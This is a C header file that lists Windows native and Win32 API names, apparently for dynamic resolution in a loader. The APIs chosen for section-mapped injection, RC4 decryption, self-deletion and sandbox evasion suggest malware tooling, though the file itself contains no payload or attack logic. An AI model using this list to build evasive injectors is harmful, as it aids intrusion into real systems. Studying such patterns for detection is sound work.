#pragma once
#include <Windows.h>

PCHAR NativeApis[] = {
	"NtCreateSection",
	"NtMapViewOfSection",
	"NtUnmapViewOfSection",
	"NtClose",
	"NtCreateThreadEx",
	"NtWaitForSingleObject",
	"NtQuerySystemInformation",
	"NtDelayExecution"
};
// Remember to update this value if you add/remove any APIs
DWORD NativeApisCount = 8;

PCHAR WindowsApis[] = {
	"FindResourceW",
	"LoadResource",
	"LockResource",
	"SizeofResource",
	"GetTickCount64",
	"OpenProcess",
	"CallNextHookEx",
	"SetWindowsHookExW",
	"GetMessageW",
	"DefWindowProcW",
	"UnhookWindowsHookEx",
	"GetModuleFileNameW",
	"CreateFileW",
	"SetFileInformationByHandle",
	"SystemFunction032"
};
// Remember to update this value if you add/remove any APIs
DWORD WindowsApisCount = 15;